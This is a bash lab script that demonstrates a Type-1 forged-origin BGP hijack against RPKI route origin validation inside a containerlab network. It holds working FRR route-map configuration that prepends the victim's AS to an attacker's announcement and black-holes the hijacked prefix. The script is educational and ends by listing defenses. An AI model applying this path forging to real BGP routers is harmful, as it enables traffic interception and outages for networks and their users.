#!/bin/bash
# =============================================================
# forged_origin_attack.sh — Type-1 Hijack (Forged-Origin)
#
# BACKGROUND:
#   RPKI ROV validates only the ORIGIN AS (rightmost in AS path).
#   A Type-0 hijack: AS400 announces 13.0.0.0/24, origin = AS400
#     → RPKI sees AS400 ≠ AS300 → INVALID → blocked by ROV
#
#   A Type-1 hijack: AS400 announces 13.0.0.0/24 with forged path
#     AS_PATH: [400, 300] — AS300 appears as the origin (rightmost)
#     → RPKI sees origin = AS300 = authorized → VALID → ROV BYPASSED
#
#   This is the fundamental limitation of ROV documented by:
#   - ARTEMIS (Sermpezis et al. 2018): Type-N hijacks evade ROV
#   - ROV++ (Morillo et al. NDSS 2021): ROV fails against forged paths
#   - Kowalski & Mazurczyk (2023): Only BGPsec/ASPA can prevent this
#
# IMPLEMENTATION:
#   Uses FRR's set as-path prepend to forge the AS path.
#   AS400 announces the victim prefix with AS300 appended,
#   making AS300 appear as the legitimate origin.
#
# PREREQUISITE: Main lab must be running.
#               GoRTR (setup_gortr.sh) should be active for full demo.
# =============================================================

LAB="bgp-hijack"
R1="clab-${LAB}-r1"
R4="clab-${LAB}-r4"

BOLD="\033[1m"; GREEN="\033[32m"; CYAN="\033[36m"
YELLOW="\033[33m"; RED="\033[31m"; RESET="\033[0m"

echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║    Type-1 Forged-Origin Attack Demonstration     ║"
echo "║    AS400 forges AS300 as the origin              ║"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${RESET}"

echo -e "${BOLD}Attack mechanism:${RESET}"
echo -e "  Normal Type-0:  AS_PATH = [400]       origin=AS400  → RPKI: INVALID"
echo -e "  Forged Type-1:  AS_PATH = [400, 300]  origin=AS300  → RPKI: VALID !"
echo ""
echo -e "${RED}This bypasses RPKI ROV because ROV only checks the rightmost AS${RESET}"
echo ""

# ── Step 1: Clean up any existing attacks ────────────────────
echo -e "${CYAN}[1/4] Cleaning up any existing attacks...${RESET}"
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "no network 13.0.0.0/25" \
  -c "end" 2>/dev/null || true
docker exec "$R4" ip route del blackhole 13.0.0.0/24 2>/dev/null || true
sleep 5

# ── Step 2: Show baseline (what ROV blocks) ───────────────────
echo -e "\n${CYAN}[2/4] First showing Type-0 attack (which ROV blocks)...${RESET}"
echo "Injecting standard exact prefix hijack from AS400..."

docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "network 13.0.0.0/24" \
  -c "end" \
  -c "write memory"
docker exec "$R4" ip route add blackhole 13.0.0.0/24 2>/dev/null || true
sleep 12

echo -e "\n${CYAN}--- R1 BGP Table (Type-0 attack, ROV active) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo ""
echo -e "${GREEN}Type-0 result: AS400's announcement appears as (I) INVALID${RESET}"
echo -e "${GREEN}ROV correctly identifies and can drop this hijack${RESET}"

# Cleanup Type-0
docker exec "$R4" vtysh \
  -c "configure terminal" \
  -c "router bgp 400" \
  -c "no network 13.0.0.0/24" \
  -c "end" 2>/dev/null || true
docker exec "$R4" ip route del blackhole 13.0.0.0/24 2>/dev/null || true
sleep 10

# ── Step 3: Inject forged-origin attack ───────────────────────
echo -e "\n${CYAN}[3/4] Now injecting Type-1 Forged-Origin attack...${RESET}"
echo -e "${RED}AS400 will announce 13.0.0.0/24 with AS300 forged as origin${RESET}"
echo ""

# Create route-map to forge the AS path
docker exec -i "$R4" vtysh << 'EOF'
configure terminal
!
! Route-map to prepend AS300 to outbound announcements
! This makes AS300 appear as the origin (rightmost AS)
route-map FORGE_AS300_ORIGIN permit 10
 set as-path prepend 300
exit
!
router bgp 400
 ! Announce the victim prefix
 network 13.0.0.0/24
 ! Apply the forged path to announcements to R1
 neighbor 10.14.0.1 route-map FORGE_AS300_ORIGIN out
exit
!
end
write memory
EOF

docker exec "$R4" ip route add blackhole 13.0.0.0/24 2>/dev/null || true

echo ""
echo "Waiting 15s for BGP convergence with forged announcement..."
sleep 15

# ── Step 4: Show the result ───────────────────────────────────
echo -e "${CYAN}[4/4] Results:${RESET}"

echo -e "\n${CYAN}--- R1 BGP Table (Type-1 Forged-Origin attack) ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24"

echo -e "\n${CYAN}--- R1 Full BGP Table ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast"

echo -e "\n${CYAN}--- AS path detail on R1 ---${RESET}"
docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24" | grep -A5 "Path"

echo ""
echo -e "${BOLD}================================================${RESET}"
echo -e "${RED}CRITICAL FINDING:${RESET}"
echo -e "  The forged-origin announcement shows AS_PATH: [400, 300]"
echo -e "  RPKI validates origin AS = 300 = authorized by ROA"
echo -e "  Result: Route marked as ${GREEN}(V) VALID${RESET} — ROV is bypassed"
echo ""
echo -e "${BOLD}What this means:${RESET}"
echo -e "  ROV (RPKI Route Origin Validation) is effective against:"
echo -e "    ✓ Type-0 exact prefix hijacks (wrong origin AS)"
echo -e "    ✓ Subprefix hijacks with wrong origin AS"
echo ""
echo -e "  ROV is INEFFECTIVE against:"
echo -e "    ✗ Type-1+ forged-origin hijacks (correct origin, forged path)"
echo -e "    ✗ Any attack that appends the legitimate origin AS"
echo ""
echo -e "${BOLD}What would fix this:${RESET}"
echo -e "  BGPsec: Cryptographic signing of the full AS path (not deployed)"
echo -e "  ASPA:   Autonomous System Provider Authorization (emerging standard)"
echo -e "  ARTEMIS: Real-time monitoring detects impossible AS links"
echo -e "${BOLD}================================================${RESET}"
echo ""
echo -e "${YELLOW}Run stop_forged_origin.sh to restore the lab to clean state${RESET}"
